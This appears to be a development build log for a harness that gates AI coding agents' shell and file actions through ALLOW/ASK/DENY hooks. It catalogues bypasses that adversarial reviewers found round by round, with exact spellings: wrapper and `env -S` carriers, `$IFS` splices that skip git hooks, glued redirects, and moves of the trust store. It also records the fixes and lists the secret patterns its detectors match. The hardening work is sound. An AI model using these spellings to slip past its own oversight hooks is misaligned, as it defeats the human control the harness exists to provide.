# Build log

One entry per phase (baseline section M, item 20). Every entry records the four check lines exactly as they stand:
`DETERMINISTIC CHECKS`, `IN-SESSION REVIEW`, `INDEPENDENT-AGENT REVIEW`, `CONFORMANCE`. An in-session review never
substitutes for an independent-agent review; a deferred check is never marked passed.

## Phase 0 — repository skeleton, toolchain, frozen baseline (commit b9434b3, 2026-09-11)

- DETERMINISTIC CHECKS: PARTIAL — typecheck and prettier config PASSED; the lint target committed at this phase
  (`eslint packages scripts`) in fact exits 2, because `scripts/` holds only `.mjs` files and the flat config
  ignores `**/*.mjs`, so eslint is handed no lintable file and errors. Corrected in phase 1 to `eslint packages tests`
  (exit 0). This line is recorded PARTIAL, not PASSED: the original claim was wrong and is left visible rather than
  rewritten, per "honest over fake parity / never mark a check passed that did not pass".
- IN-SESSION REVIEW: PASSED
- INDEPENDENT-AGENT REVIEW: DEFERRED_BUDGET (subagent budget exhausted at the time; re-run folded into the phase 1 review below)

#### Rounds 13-15 (2026-09-22)

| Round | Instrument | Claimed | Confirmed | Fix commits |
|------:|---|--------:|----------:|---|
| 13 | 14 adversarial clusters with shared reproduction probes | 76 | 61 | `fbf8643`, `c4c64e6` |
| 14 | the same 14 clusters | 94 | 76 | `703ba13`, `cd08a98` |
| 15 | the same 14 clusters, so the count is comparable | 84 | 67 | `356ff2c`, `fc68ca9` |

Every confirmed finding of rounds 13-15 was fixed and pinned; re-probing both corpora against HEAD reports zero
reaching ALLOW (44 land on ASK, 23 on DENY for round 15). Round 15's findings were classified A/B/C/D per the
product owner's instruction: 14 regressions, 23 generalizable classifier defects, 29 enumeration-tail cases mapped to
the containment requirement on issue #26, and 1 non-bypass.

A further **independent challenge of the new layered contract** (not of the shell-syntax surface) ran on 2026-09-22
and confirmed **22 findings against the contract itself**, 17 of them HIGH. They are unresolved. Phase 1 therefore
does NOT meet exit-criterion point 10 and is not complete.

- CONFORMANCE: NOT RUN (nothing to conform yet)

## Phase 1 — kernel core (2026-09-14 → 2026-09-15; local commits 257e2d9, ff122a0, and the round-3 fix commit)

Scope delivered: control-plane parser and loader (fail-closed), policy compiler and compiled authority table with lock
tiers (Q98), authority evaluation with effect-based and path-aware command classification (package scripts, shell
scripts, make targets, `find -exec`, substitutions, wrappers, global option flags, aliases, environment injection,
redirections and copy/archive destinations, `cd` tracking), execution budgets with per-step retry hard stop,
containment catalogue, host capability matrix, trust classes, redaction, neutral hook model with `claude-code` and
`codex-cli` dialects (Codex fail-closed until conformance), runtime root (stamp, sessions with a pid-aware lock,
redacted ledger), launcher (index-first dispatch, cross-name IDENTITY_CONFLICT, `ego.node` floor, Q96 gate on both the
in-process and the delegation path, in-process equal run, dynamic-import delegation), launcher set (`version`, `sync`
from cache and `file:` sources, `distribution import|verify` with manifest-bound signatures, `bootstrap doctor
[--reverify]` naming the launcher's own conflicts), immutable cache verified over every byte, index with state
clearing on re-established trust, trust store seeding and at-least-one-key verification, pin with `--repin` as a human
act, `init` (authored templates kept apart from generated artifacts, standing-rules source tracking, husky and
custom hooks-directory support, refusal of machine-wide `core.hooksPath`), `doctor` (host-determined containment,
honest INPUT_CALLER_UNVERIFIED / CHANNEL_UNVERIFIED lines), `check`, `status`, `help`, `capabilities`,
`explain capability`, `modes`, `context explain`, `sources`, `budget extend`, `redact`, git hook shims (pre-commit
secret scan, pre-push scan of every pushed commit including merges and `--text`, chained pre-existing hooks with a
captured stdin), POSIX fail-closed shims.

Explicitly deferred (the CLI says so instead of faking): `upgrade`, `rollback`, remote source adapters (npm, HTTPS,
GitHub Release), `distribution bundle` (phase 6); tasks, held scopes, forge, workspace registry (phase 2); skills,
catalog, `ask` (phase 3); grilling, evidence, benchmark (phase 4); policies, stakeholder packs, decisions (phase 5);
deterministic prompt-hook caller verification (phase 6 conformance, K14 / open item 13).

September 2026 alignment applied in this phase: see `docs/architecture/alignment-2026-09.md` (24 items classified;
Q98 opened and implemented under the recommended default, awaiting confirmation).

### Independent-agent review record

- **Round 1** (workflow `ego-phase1-independent-review`, 7 reviewers, 2 refuters per finding): 66 raw findings,
  49 confirmed (10 HIGH), 9 unverified when the session limit interrupted the refuters, 8 refuted. Every confirmed
  finding was fixed and pinned by a test before round 2.
- **Round 2** (workflow `ego-phase1-review-round2`, one skeptic per round-1 finding, 2 refuters per unverified and
  fresh finding, 3 fresh adversarial reviewers, conformance audit): 15 of 48 fixes verified complete; 33 reported a
  sideways variant of the same class or a missing test; of the 9 unverified round-1 findings 8 were refuted and 1
  confirmed (LOW); 18 fresh findings (5 HIGH: `find -exec`, process substitution, glob/archive routes into `.harness/`,
  tool-less PreToolUse payloads answering ALLOW, machine-wide `core.hooksPath` pollution; plus the chained pre-push
  hook consuming git's stdin). Every confirmed residual and fresh finding was fixed and pinned by a test (see
  `packages/kernel/test/bypass.test.ts`, `hooks.test.ts`, `control-plane.test.ts`, `launcher.test.ts`,
  `tests/integration/cli.test.ts`) before round 3.
- **Round 3** (workflow `ego-phase1-review-round3`, one skeptic per open round-2 finding, 2 fresh reviewers with
  double verification, conformance and build-log audit; two launches were lost to the session and credit limits and a
  third completed all 83 agents): of 52 open findings 19 were verified fully fixed, the rest reported a sideways
  variant of the same class; 14 fresh confirmed findings, plus one HIGH conformance defect (D1: an agent could write
  the organization or overlay policy file the hook compiles from, widening authority on the next call). Every
  confirmed HIGH and MEDIUM was fixed and pinned by a test this round:
  - **Effect evaluation** (`evaluate.ts`): the shell tokenizer removes backslash escapes; command and process
    substitution bodies are quote-aware; `env` and every transparent wrapper (`chrt`, `taskset`, `setsid`,
    `cpulimit`, `flock`, `timeout -s`, …) surface their environment injections and never mask the wrapped command;
    `xargs -I`/`-J` replace strings no longer de-anchor the payload; a locked verb carried in argument position
    through an unknown launcher is found; write destinations are resolved after `cd`, through the destination flags of
    `cp`/`cpio`/`tar`, and a `ln` target or an archive extracted into a directory containing a protected tree is
    caught; path globs match case-insensitively; nested `.git` and `.husky` are protected; `find … -delete` is a
    scoped deletion, not a whole-tree wipe; Grep/Glob/LS over a credential store or HOME are denied.
  - **Authority never widens from the working tree** (D1, `policy/cache.ts`): a hook applies a layer edit that
    narrows at once, but an edit that widens anything is clamped to the last human-accepted table and recorded as
    pending; only `ego init` from a human terminal accepts it. `policies/organization/**` and `.harness/mcp-trust.md`
    are protected paths; `ego init --profile`/`--task-source` on a pinned project is refused from an agent shell.
  - **Budgets and modes** (`hooks/handle.ts`): a budget breach or retry cap never turns a DENY into an ASK; the
    session-record mode is honoured only when it exists in the compiled table (EGO_MAINTENANCE only in the EGO
    repository); the iteration counter resets only on a real session start.
  - **Git hooks** (`githooks.ts`, `git-hook.sh`): one chaining shim in every layout (default, custom `core.hooksPath`,
    husky), so a pre-existing hook keeps its stdin and its language and a missing shim in a pinned checkout fails
    closed; the pre-commit scan lists NUL-separated names and includes type changes; the pre-push scan excludes only
    known dependency lockfiles.
  - **Diff, loader, launcher, misc**: the authority diff covers grant phrases, protected paths, pre-denied classes
    and new mode cells (all MAJOR); the loader rejects a capability bullet without a checkbox and a null `narrow`; a
    symlink planted in the immutable cache fails verification; the session lock breaks a dead holder's lock by rename;
    the release build refuses an untagged or dirty tree; the Azure DevOps `*.visualstudio.com` remote parses correctly.
- **Round 4** (workflow `ego-phase1-review-round4`, one skeptic per open round-3 finding, fresh adversarial reviewers,
  conformance + build-log audit): of the round-3 fixes, 19 were verified fully fixed; the rest reported a sideways
  variant of the SAME class rather than a new class, plus fresh confirmed findings. Eight confirmed items (2 HIGH,
  4 MEDIUM, 2 LOW) were fixed and pinned this round:
  - **`env -S` / `--split-string`** (HIGH, `evaluate.ts`): the wrapper no longer swallows the split-string value as an
    opaque option; it re-tokenizes the value as leading `NAME=value` assignments plus the inner command and classifies
    it, so `env -S "git push origin main"` and the `--split-string=` form deny like `env -- …` and `bash -c`.
  - **File-loaded GraphQL mutation** (HIGH, `matchers.md`): a `gh|glab api graphql` whose body is loaded from a file or
    stdin (`field=@path`) can no longer be proven a read, so it routes to `forge.api.mutate` (DENY) instead of falling
    through to `forge.repo.read`; inline read queries are unaffected.
  - **Glued short forge fields** (MEDIUM, `matchers.md`): the field-flag separator accepts the glued `gh api -ftitle=x`
    spelling gh/cobra accept, closing the `-f`/`-F` mutation route that required a space or `=`.
  - **`pax` copy destination** (MEDIUM, `evaluate.ts`): pax copy mode writes to its LAST operand (the destination
    directory), like `cp`/`mv`; only `cpio -p` takes its sole operand. `pax -rw src .harness/generated` now denies.
  - **Carried `sh -c` body** (MEDIUM, `evaluate.ts`): `find -exec` / `xargs -I` / `parallel` payloads are re-quoted
    before re-tokenization, so a carried `sh -c "git push"` body survives and is classified.
  - **Chained hooks on a spaced path** (MEDIUM, `git-hook.sh` + `githooks.ts` `shimScript`): the chained hook is invoked
    as a quoted path, not an unquoted `run=` string, so a hooks directory whose path contains a space no longer
    word-splits (which had silently skipped the user's hook and aborted every commit/push).
  - **`git merge -n`** (LOW, `matchers.md`): `-n` means `--no-stat` for merge, not `--no-verify`; the hook-bypass
    matcher now scopes the `-n` short form to `git commit` and keeps `--no-verify` for push/merge, removing the false
    DENY on an ordinary `git merge -n`.
  - **Retry hard stop** (LOW, `handle.ts`): the failure-map eviction never drops a step that has already reached its
    retry cap (it evicts the least-failed uncapped key), and the step key is normalised (whitespace, trailing
    separators, trailing comments) so cosmetic variants of a capped command stay capped.
  Also this round: the Phase 0 lint check line was corrected to PARTIAL (the committed `eslint packages scripts`
  target could not pass), and the delegated-entry latency claim was corrected — only the in-process kernel path is a
  sub-60 ms budget; the delegated entry path is bounded by a contention-robust ceiling, not asserted at 60 ms. Every
  fix above is pinned by a test (`bypass.test.ts` round-4 residuals, `control-plane.test.ts` CommonMark `+`,
  `hooks.test.ts` retry-stop normalisation and no-evict-cap, `githooks.test.ts` spaced-path chained hook).
- **Round 5** (workflow `ego-phase1-review-round5`, 48 agents: cluster skeptics per round-4 fix plus fresh adversarial
  reviewers, each finding reproduced by two adversarial refuters before it counted): the six round-4 fixes all HELD,
  but the pass surfaced 19 confirmed findings — mostly sideways variants of the same classes one step out, plus
  pre-existing gaps earlier rounds had not reached. 15 HIGH / 2 MEDIUM / 2 LOW, every one fixed and pinned this round:
  - **Inline-interpreter body writes** (2 HIGH + 1 MEDIUM, `matchers.md`): `node -e` / `python -c` / `ruby -e` / `perl`
    whose body NAMES a protected store (`~/.ssh`, `~/.ego/trust`, `.git/hooks`, `.harness/generated`) was ASK
    `command.interpreter-inline`; it now fails closed to the same deny the literal `cp`/`tee` receives
    (credential-store, trust, hook-config, git-internals, harness-runtime). Ordered before `command.interpreter-inline`
    because `classifyNormalized` takes the first matching matcher.
  - **Archive-create destinations** (2 HIGH, `evaluate.ts`): `tar -cf <archive>` (create) and `pax -w -f <archive>`
    write the archive path; the destination resolver treated tar as extract-only (`-C`) and pax as last-operand, so a
    write into `.harness/generated` / `.git/hooks` was ALLOW/ASK. A mode-aware resolver now takes the `-f`/`--file`
    operand (including combined `-cf`/`-wf`) as the write in create/write mode.
  - **`mv` source containment** (1 HIGH, `evaluate.ts`): `mv .harness /tmp` relocates the whole control tree at ALLOW —
    only the destination was checked. `mv`/`rename` now treat every operand as a write (the source is removed).
  - **EGO_HOME trust dir node** (2 HIGH + 1 MEDIUM, `evaluate.ts`): the trust-store check required a strict descendant
    (`<home>/trust/…`), so `mv ~/.ego/trust /tmp`, `cp -r ~/.ego/runtimes …` and `rm -rf ~/.ego/releases` escaped; the
    directory node itself now counts, across trust/index/releases/runtimes.
  - **`env -S` leading option** (1 HIGH, `evaluate.ts`): `env -S "-u X git push"` began the split value with env's own
    option, which the re-parser took as the command head → ASK. The split value is now re-parsed through a synthetic
    `env` so its leading options/assignments are stripped and the real command is classified.
  - **Glued redirection** (1 HIGH, `evaluate.ts`): `echo x>.harness/generated/policy.json` (no space) was not seen as a
    redirect; the target scanner now un-glues an operator stuck to the preceding word.
  - **Multi-token `cd`** (1 MEDIUM, `evaluate.ts`): `cd -- .harness/generated && cp …` desynced the tracked cwd; the cd
    parser now skips `--` and options and takes the last positional.
  - **File-loaded GraphQL via `--input`/`-i`** (1 HIGH, `matchers.md`): the round-4 `=@` fix missed `--input`/`-i -`;
    both now route a graphql body to `forge.api.mutate`.
  - **Combined `git commit -nm`** (1 MEDIUM, `matchers.md`): `-nm` parses as `-n -m` (`--no-verify`); the hook-bypass
    matcher now matches a short-flag cluster containing `n`.
  - **Missing production verbs** (1 HIGH k8s + 1 MEDIUM cloud, `matchers.md`): `kubectl … debug|certificate` and more
    state-changing `aws` verbs (EC2 lifecycle, `s3 rm`, `lambda invoke`, …) are added to the production matchers.
  - **Pre-push decoy ref** (1 MEDIUM, `githooks.ts`): the new-branch scan used `--not --remotes`, and a planted
    `refs/remotes/origin/*` hid a secret; it now excludes only the remote SHAs git itself reports for the push
    (unforgeable), scanning the branch in full when there is no trustworthy baseline.
  - **Retry-stop no-op escape** (1 LOW, `handle.ts`): `npm test;#1` / `&& :` / `|| true` / `{ … }` minted fresh retry
    keys; the key now normalises to the first command of the line. No authority is granted either way.
  - **Ordered-list deny vanish** (1 LOW, `load.ts`): a capability written with an unsupported marker (`1.`/`1)`) parsed
    as prose and disappeared with no error; the loader now fails closed on a mislaid capability declaration.
  Each fix is pinned (`bypass.test.ts` round-5 residuals, `control-plane.test.ts` ordered-list, `hooks.test.ts`
  retry no-op, `tests/integration/cli.test.ts` planted-ref pre-push). Suite: 135 tests.
- **Round 6** (workflow `ego-phase1-review-round6`, 42 agents, adversarial refutation): the round-5 fixes held; 16
  confirmed findings surfaced (13 HIGH/MEDIUM, 3 LOW) — sideways variants of the round-5 classes plus deeper
  pre-existing gaps. All fixed and pinned:
  - **Sideways archivers** (2 HIGH + 1 MEDIUM, `evaluate.ts`): `zip` had no write-destination branch; `bsdtar`/`gtar`
    were absent from WRITE_HEADS; tar extract honoured only `-C`, not `--directory`/`--cd`. All now resolve the
    archive/extract destination and DENY into a protected tree.
  - **Trust store via glob / parent** (1 HIGH + 1 MEDIUM, `evaluate.ts`): `rm -rf ~/.ego/*`, `~/.ego/trust*`,
    `~/.ego/trus[t]` and a recursive `cp -r ~/.ego` escaped the strict-descendant check; a glob/parent reachability
    guard now denies them (`reachesTrustStore`).
  - **Glued-digit redirect** (1 HIGH, `evaluate.ts`): `echo x2>PATH` (a word ending in a digit glued to `>`) is
    un-glued and classified as a write.
  - **ANSI-C quoting** (1 HIGH, `evaluate.ts`): the tokenizer now expands `$'...'` (`$'delete'`, `$'\x70ush'`), so a
    locked verb hidden in ANSI-C quoting is seen.
  - **Inline-interpreter newline** (1 HIGH, `matchers.md`): the body matchers' trailing wildcard is now newline-tolerant
    (`[\s\S]*`), so a newline before the protected path no longer downgrades the deny. (Fully-obfuscated bodies —
    string concatenation, char-codes — still reach ASK, the human gate; that floor is by design, not a silent ALLOW.)
  - **GraphQL from a variable/substitution** (1 HIGH, `matchers.md`): an opaque `gh api graphql -f query=$VAR` / `=$(…)`
    body cannot be inspected, so it fails closed to `forge.api.mutate`.
  - **AWS S3 verbs** (1 MEDIUM, `matchers.md`): `s3 rm|mv|cp|sync|rb|mb` and s3api/ecr mutations added to
    `production.cloud.mutate`.
  - **`git commit -nm` precision** (1 LOW→fixed as correctness, `matchers.md` + `evaluate.ts`): the message-scanning
    matcher is replaced by a quote-aware evaluator check, so a combined `-nm`/`-nam` denies but a `-n` inside the `-m`
    message does not (removes a false-positive DENY while keeping the bypass caught).
  - **`.harness/hooks/**` on the file tool** (1 MEDIUM, `matchers.md`): the enforcement shims are the absolute
    `ego.runtime.tamper` on Write/Edit too, not the weaker `fs.hook-config.write`.
  - **Retry-stop leading no-op** (1 LOW, `handle.ts`): the key now normalises to the first REAL command, so a prepended
    `: ;`/`true &&`/`x=1 ` no-op cannot mint a fresh key either.
  - **Malformed checkbox** (1 LOW, `load.ts`): a bullet with a malformed checkbox (`- [-]`, `- [~]`, `- [ x]`) fails
    closed instead of silently dropping the capability.
  - **EGO_MAINTENANCE spoof** (1 MEDIUM, `handle.ts`): the mode is gated on the unforgeable signal that the running
    kernel's control-plane lives inside the repo (`pathInside`), not on package files an agent can forge.
  - **Worktree fail-open** (1 MEDIUM, `githooks.ts`): a linked worktree's shim now resolves `.harness` in the main
    worktree via the git common dir, so governance runs (it previously fell through to "not governed").
  Each fix is pinned (`bypass.test.ts` round-6 residuals; `control-plane.test.ts` malformed-checkbox; `hooks.test.ts`
  retry-prepend + maintenance-spoof; `githooks.test.ts` linked-worktree). Suite: 140 tests.
- **Round 7** (workflow `ego-phase1-review-round7`, adversarial refutation, with an explicit floor rule: an opaque
  command reaching ASK is the designed human gate, not a bypass — report only reaches to ALLOW or a concrete missed
  DENY spelling): **incomplete — the session usage limit interrupted 13 of 16 agents** (all four fresh surfaces, three
  verify clusters, and every refuter). The three verify clusters that finished each reported one HIGH reach to ALLOW,
  which the interrupted refuters could not vote on; all three were reproduced by hand and fixed and pinned:
  - **Dash-less tar** (HIGH, `evaluate.ts`): traditional `tar xf`/`cf`/`czf` (function letters with no leading `-`) was
    not recognised as create/extract, so `tar cf .harness/generated/x a` and `tar xf a -C .harness/generated` reached
    ALLOW. The resolver now reads the dash-less mode operand and its archive (tokens[2]).
  - **`mv` of the EGO_HOME parent** (HIGH, `evaluate.ts`): `mv <EGO_HOME> /tmp` relocates the whole trust tree without a
    recursive flag and reached ALLOW; `mv`/`rename` are now treated as whole-tree ops in the trust-parent guard.
  - **`git commit` bypass via a carrier** (HIGH, `evaluate.ts`): `env -S 'git commit -nm x'`, `--split-string=…` and
    `bash|sh -c '…'` hid the hook-bypass flag in a quoted value; the quote-aware check now scans the carrier's inner
    command too (`env -S 'git commit -m "fix -n"'` still correctly ALLOWs).
  Pinned by `bypass.test.ts` round-7 residuals. This round is NOT a clean pass: the fresh surfaces (redaction,
  budgets/cache, launcher/exec-contract, containment) and the remaining verify clusters were not run. Round 8 re-runs
  them once the usage limit resets. Suite: 141 tests.
- **Round 8** (workflow `ego-phase1-review-round8`, 23 agents ran to completion, adversarial refutation with the floor
  rule): 6 confirmed findings (3 HIGH, 3 MEDIUM), each reproduced and fixed and pinned:
  - **tar write modes** (HIGH, `evaluate.ts`): append (`r`/`--append`), update (`u`/`--update`) and catenate (`A`)
    write the archive but were not classified as writes (only create/extract were); and the dash-less blocking-factor
    spelling `tar cbf 20 ARCHIVE` put the archive at the wrong operand. The resolver now covers every write mode and
    computes the dash-less archive operand from the function letters that consume an argument.
  - **Quoted commit hook-bypass flag** (HIGH, `evaluate.ts`): `git commit "-n" -m x` / `-n"m"` / `-"n"` were skipped
    because the check ignored every quoted token. It now dequotes and parses the short-flag cluster properly (`n`
    before any `m`/`F` = --no-verify), and skips only the value token a `-m`/`-F` actually consumes — so `-mn` /
    `-mfoon` / `-m "-n"` stay ALLOW while the quoted bypass denies.
  - **Multi-digit glued redirect** (HIGH, `evaluate.ts`): the round-7 un-glue split a word ending in two or more
    digits (`echo x12>PATH`), so the target scanner missed it; it now un-glues only the operator, keeping the digits
    with the word.
  - **Password-span redaction leak** (MEDIUM, `redact.ts`): a captured DB/URL password equal to the username or scheme
    (`postgres://admin:admin@…`) was redacted at the wrong occurrence, leaving the raw secret in the returned text and
    thus the ledger. Redaction now splices the exact captured span using match indices.
  - **Slack token coverage** (MEDIUM, `secrets/saas-ai.md`): app-level `xapp-` and refresh `xoxe-` tokens are now
    blocked like `xoxb-`/`xoxp-`.
  - **Control-plane write matcher** (MEDIUM, `matchers.md`): `control-plane/**` and the `policies/{baselines,frameworks,
    schemas,templates}/**` baselines had no file-tool matcher, so an in-repo agent could rewrite the EGO authority
    baseline (Write/Edit or shell) at ALLOW; they now map to `ego.control-plane.edit` (DENY outside
    EGO_MAINTENANCE), which also covers shell writes via the containment check.
  Pinned by `bypass.test.ts` round-8 residuals and `redact.test.ts` round-8 cases. Suite: 144 tests.
- **Round 9** (workflow `ego-phase1-review-round9`, 31 agents, complete run, adversarial refutation): 10 confirmed
  findings (7 HIGH, 3 MEDIUM), each reproduced and fixed and pinned. Most were secret-detector coverage gaps:
  - **Secret-scan coverage** (`secrets/*.md`): npm (`npm_…`), PyPI (`pypi-…`), Azure `SharedAccessKey=` (Service Bus /
    Event Hub / IoT, alongside the existing `AccountKey=`), DigitalOcean (`dop_v1_`/`doo_v1_`/`dor_v1_`) and Docker Hub
    (`dckr_pat_`) tokens are now block-severity detectors.
  - **`>|` noclobber redirect** (`evaluate.ts`): `splitShellSegments` split on the `|` of `>|`, severing the write
    target; it no longer splits a `|` preceded by `>`, so `echo x>|.harness/generated/…` denies like `>`/`>>`.
  - **Commit `$IFS` splice** (`evaluate.ts`): `git commit -n$IFS -m x` / `-n${IFS}` / `-n$""` reconstruct a bare `-n`
    at the shell; the commit scan now models `$IFS` field-splitting and empty `$`-expansions before the cluster test
    (and correctly skips a message consumed by a cluster ending in `m`/`F`, so `-am`/`-qm` messages stay ALLOW).
  - **`.git` gitlink file** (`matchers.md`): the DENY matcher guarded only `.git/` contents, so overwriting the `.git`
    pointer FILE of a worktree/submodule (repointing all internals and hooks) reached ALLOW; `**/.git` is now protected.
  - **Nested host hook config** (`matchers.md`): `.claude/settings.json`, `…local.json` and `.codex/**` were matched
    only at a registered repo root; they now carry the `**/` prefix like `**/.git/hooks/**`, so a nested copy in a
    monorepo package is protected too.
  Pinned by `bypass.test.ts` round-9 residuals and `redact.test.ts` round-9. Suite: 146 tests.
- **Round 10** (workflow `ego-phase1-review-round10`, 33 agents, complete run, adversarial refutation): 13 confirmed
  findings (8 HIGH, 5 MEDIUM), each reproduced and fixed and pinned. Nine were secret-detector provider gaps; the
  taxonomy was broadened once (new file `control-plane/secrets/more-providers.md`) with distinctive-prefix detectors
  for Databricks, Shopify, Terraform Cloud, New Relic, Grafana, Square, Google OAuth (`GOCSPX-`), Stripe webhook
  (`whsec_`), plus a get-ahead batch (GitHub fine-grained/app tokens, Linear, Notion, Figma, Doppler, PlanetScale,
  Sentry). The other four:
  - **Commit `${IFS%?}` splice** (HIGH, `evaluate.ts`): the round-9 `$IFS` fix missed parameter-expansion trims
    (`${IFS%?}`, `${IFS#?}`, `${IFS:0:1}`, `${x:- }`, `${#}`); the scan now replaces every `$`-expansion in a flag token
    with a separator before the cluster test.
  - **`>>|` redirect** (MEDIUM, `evaluate.ts`): the target scanner recognised `>|` but not `>>|` (append + noclobber
    override); the redirect regex now accepts an optional trailing `|` on `>`/`>>`.
  - **Symlinked `.git`** (MEDIUM, `evaluate.ts`): `matchPathPattern` tested only the realpath-resolved path, so a `.git`
    that is itself a symlink lost the name and a Write/Edit to `.git/config` or `.git/hooks/*` reached ALLOW; it now
    tests the lexical path too (still catching a symlink that points INTO a protected tree via the canonical path).
  - **Install lifecycle scripts** (HIGH, `evaluate.ts`): `npm install`/`ci`/`add` (and `pnpm`/`yarn`) run
    preinstall/install/postinstall/prepare, which were never effect-analysed; they are now, so a `postinstall` that
    pushes or mutates production escalates (a benign install stays a local mutation).
  Pinned by `bypass.test.ts` round-10 residuals and `redact.test.ts` round-10. Suite: 148 tests.
- **Round 11** (workflow `ego-phase1-review-round11`, 25 agents, complete run, adversarial refutation): the round-10
  fixes held; 9 confirmed findings (7 HIGH, 2 MEDIUM), each reproduced and fixed and pinned:
  - **Commit default-value expansion** (HIGH, `evaluate.ts`): `git commit -${x:-n}`/`${x:---no-verify}`/`${x:=n}`/`${x-n}`
    substitute the literal default at the shell; the scan now expands `${var:op word}` to its word before the check.
  - **`sh -euc` cluster** (MEDIUM, `evaluate.ts`): a combined short-flag cluster ending in `c` (`-euc`, `-ec`, `-lc`)
    is now recognised as the `-c` command flag, so the carried payload is classified (this also closes a related
    reach-to-ALLOW where a package script `sh -euc 'git push'` was opaque and swallowed by its declared build class).
  - **Cloud global option** (MEDIUM, `matchers.md`): a global option before the service/verb (`aws --profile prod iam
    delete-user`, `terraform -chdir=… apply`) defeated the positional production matchers; they now skip leading
    options.
  - **Tilde file paths** (HIGH, `evaluate.ts`): a literal `~/…` on the Read/Write/Edit tool was resolved to
    `<cwd>/~/…` inside the repo; `classifyPath` now home-expands it, so `~/.ssh/id_rsa` denies.
  - **make `-C DIR`** (HIGH, `evaluate.ts`): the change-directory argument was mis-parsed as a target (dropping the
    recipe analysis); make option arguments are now skipped and the Makefile is read from the `-C` directory.
  - **Install lifecycle list** (HIGH, `evaluate.ts`): the analysed set now matches the hooks npm actually runs on
    install — `prepublish`, `preprepare`, `postprepare`, `dependencies` — and drops publish-only `prepublishOnly`.
  - **More secret detectors** (HIGH, `secrets/more-providers.md`): Postman (`PMAK-`), Tailscale (`tskey-`), Supabase
    (`sbp_`), Atlassian (`ATATT3xFfGF0`).
  - **curl `-u` secret username** (MEDIUM, `redaction/curl.ts`): a long token-like `-u` username (e.g. a Stripe key in
    the username position) is now redacted, while a short human username is kept.
  Pinned by `bypass.test.ts` round-11 residuals and `redact.test.ts` round-11. Suite: 150 tests.
- **Round 12** (workflow `ego-phase1-review-round12`, 17 agents, complete run, adversarial refutation): the round-11
  fixes held; 5 confirmed findings (4 HIGH, 1 MEDIUM), each reproduced and fixed and pinned:
  - **Commit embedded empty expansion** (HIGH, `evaluate.ts`): an unset `${x}` VANISHES and glues fragments into a
    flag (`-${x}-no-verify` -> `--no-verify`, `-${x}n` -> `-n`); the scan now tests both a separator AND an empty
    substitution for residual expansions.
  - **make `-f` alternate makefile** (HIGH, `evaluate.ts`): `make -f ci.mk release` (and `--file=`/`-C DIR` `=` forms)
    never read the named makefile, so its recipe went unanalysed; the named makefile is now read.
  - **Write-capable "read-only" tools** (HIGH, `evaluate.ts`): `sort -o FILE`, `sort --output=`, `uniq IN OUT`,
    `yq -i FILE` write files but were classified read-only; they are now WRITE_HEADS with a resolved destination.
  - **`rm -rf $EGO_HOME` root** (MEDIUM, `evaluate.ts`): `rm`/`rmdir`/`shred` of the EGO_HOME root reached ASK; they
    now count as whole-tree ops in the trust-store reach check, so the root DENYs like its subdirs.
  - **AWS secret in JSON** (HIGH, `secrets/cloud.md`): a secret in `{"aws_secret_access_key":"…"}` / STS
    `{"SecretAccessKey":"…"}` slipped the context-keyed detector (closing quote before the colon); the key/value
    separator now allows the quote and the camelCase STS key.
  Pinned by `bypass.test.ts` round-12 residuals and `redact.test.ts` round-12. Suite: 152 tests.
- **Round 13**: an independent re-verification of the round-12 fixes is pending; recorded here when it completes.
- **Incident during round 2** (found 2026-09-15 when the checkpoint commit failed): EGO git hooks had been written
  into this repository's own `.git/hooks` at 02:17, pointing at a shim that does not exist here, so every commit
  failed. No pre-existing hook was displaced. Cause: `installGitHooks` accepted a directory that was not a git
  toplevel, and git resolved the hooks path upward to the enclosing repository. The stray hooks were moved to the
  session scratchpad, and `installGitHooks` now refuses any directory that is not the top level of its own
  repository (pinned by `packages/kernel/test/githooks.test.ts`).

### Check lines

- DETERMINISTIC CHECKS: PASSED — `npm run typecheck`, `npm run lint` (packages and tests), `node --test`
  (152 tests), `npm run build` (dist/ego.js, development identity `-dev.<sha>.dirty`, built from the uncommitted
  phase-1 tree; the release build refuses a dirty or untagged tree). Hook latency, stated honestly by path:
  - The **in-process kernel path** (the K26/Q19 budget: `handleHook` with an already-compiled authority table) is
    pinned under 60 ms by `packages/kernel/test/hooks.test.ts` (min-of-N, ~25 ms). This is the budget the design
    claims, and it holds under full-suite parallel load.
  - The **delegated-entry path** (a hook served by a cached runtime of a different identity through the exec
    contract) is NOT a sub-60 ms path and is no longer claimed as one. After the first (cached) dynamic import it
    still re-runs the pinned bundle's whole `main()` — self-identity, index, control-plane load + compile, the
    kernel, and the session/ledger writes — i.e. the same work a fresh process does. In isolation its floor lands
    under 60 ms, but because `node:test` runs every test file in parallel it inflates to ~70–90 ms under
    full-suite CPU contention. `tests/integration/cli.test.ts` therefore pins it under a generous, contention-robust
    250 ms ceiling (min-of-N) that catches a real regression (a re-parse per call, an O(n) blow-up) without asserting
    the kernel budget on a path that legitimately does more than the kernel.
  - Process wall-clock through `node dist/ego.js hook`, including Node start-up, is 70–80 ms: above 60 ms at the
    process level, reported as such, and not the kernel budget.
  (An earlier revision of this line claimed both the in-process and the delegated path were "pinned under 60 ms";
  that was wrong for the delegated path and is corrected here rather than left standing — honest over fake parity.)
- IN-SESSION REVIEW: PASSED — smoke-tested init → hooks → status → check → doctor → delegation on temporary
  repositories; every round-1/2/3 finding reproduced before being fixed; the D1 policy-widening defect verified closed
  end to end against the built bundle.

  **Corpus reorganized by root semantic class (2026-09-24), and it immediately found two floor crossings.** The
  regression corpus was a list of literal spellings in the order the defects arrived: it proves past bugs stay
  fixed and says nothing about a NEW spelling of an old effect. It is now twenty ROOT SEMANTIC CLASSES, each with
  an authority FLOOR, crossed with 32 effect-preserving transformations and 14 producers — the variants are
  generated, not enumerated (`packages/kernel/test/support/corpus.ts`, `corpus.test.ts`, `monotonicity.test.ts`).
  Writing it surfaced two defects that twelve adversarial rounds had not:
  1. **A shell script's body was classified as its first command only.** `analyzeSegments` split a unit into
     segments only for ISOLATED shells (make recipe lines, npm pre/post). A script is ONE shell, so its lines were
     passed through whole: `echo "$(git push origin main)"` in a `.sh` was an `echo` (ALLOW), and so was
     `echo start; git push origin main`. Every producer that hands over whole lines was affected. Splitting now
     happens for every unit; isolation decides only whether shell state RESETS between units.
  2. **A subshell reduced DENY to ASK.** `( chmod 777 /etc/passwd )` kept its parentheses inside the segment, so
     the head was `(` and every `^`-anchored matcher missed. Subshell and brace-group delimiters at a command
     position are now consumed as the shell structure they are; `((` stays arithmetic, and a `)` closing nothing
     — a `case` pattern — stays literal. A `cd` inside a subshell no longer leaks to the caller: the splitter
     emits a restore marker, and the working directory stops being claimed after the subshell closes.
  Two proportionality corrections came with it: arithmetic expansion `$((…))` was read as a command substitution,
